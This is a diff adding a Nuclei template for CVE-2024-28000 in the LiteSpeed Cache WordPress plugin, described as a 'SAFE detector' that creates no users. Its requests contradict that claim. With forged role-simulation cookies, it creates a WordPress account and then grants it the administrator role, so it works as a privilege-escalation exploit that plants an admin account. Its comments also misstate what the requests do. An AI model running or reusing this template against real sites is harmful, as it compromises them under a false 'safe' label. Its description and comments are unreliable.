@@ -1,0 +1,72 @@
+id: wp-litespeed-cache-cve-2024-28000-detector
+info:
+  name: LiteSpeed Cache (<=6.3.0.1) - Unauth Priv-Esc Indicator (SAFE Detector)
+  author: you
+  severity: high
+  description: |
+    SAFE detector for CVE-2024-28000. Compares REST /users POST behavior with and without LiteSpeed
+    role-simulation cookies. Does NOT create users; sends intentionally invalid payload to trigger
+    validation instead of account creation.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-28000
+    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/litespeed-cache/litespeed-cache-6301-unauthenticated-privilege-escalation
+    - https://patchstack.com/database/vulnerability/litespeed-cache/wordpress-litespeed-cache-plugin-6-3-0-1-unauthenticated-privilege-escalation-vulnerability
+  metadata:
+    product: litespeed_cache
+    vendor: litespeedtech
+    verified: false
+    max-request: 2
+  tags: cve,cve2024,wordpress,litespeed,wp-plugin,priv-esc,detector,safe
+
+variables:
+  # Nhận từ CLI: -var litespeed_hash=...
+  litespeed_hash: "{{litespeed_hash | default('jdeR85') }}"
+
+http:
+  # Control: không cookie ⇒ phải 401/403 (không đủ quyền tạo user)
+  - method: POST
+    path:
+      - "{{BaseURL}}/wp-json/wp/v2/users"
+    headers:
+      Content-Type: application/json  
+      Cookie: "litespeed_role=1; litespeed_hash={{litespeed_hash}}"
+    body: |
+      {
+        "username": "nuclei-a",
+        "password": "Nuclei!2025",
+        "email": "nuclei-a@example.com"
+      }
+    redirects: true
+    max-redirects: 2
+    matchers:
+      - type: status
+        status: [201]
+    extractors:
+      - type: json
+        name: user_id
+        internal: true
+        json:
+          - ".id"
+  # Test: có cookie role-simulation ⇒ vượt auth, rơi vào 400 validation (an toàn)
+  - method: POST
+    path:
+      - "{{BaseURL}}/wp-json/wp/v2/users/{{user_id}}"
+    headers:
+      Content-Type: application/json
+      Cookie: "litespeed_role=1; litespeed_hash={{litespeed_hash}}"
+    body: |
+      {
+        "roles": ["administrator"]
+      }
+    redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: status
+        # nếu bypass thật, auth check bị vượt qua và ta nhận 400 validation (thiếu email, v.v.)
+        status: [200]
+      - type: word
+        part: body
+        words:
+          # các thông điệp validation thường gặp khi đã vượt auth
+         - '"administrator"'
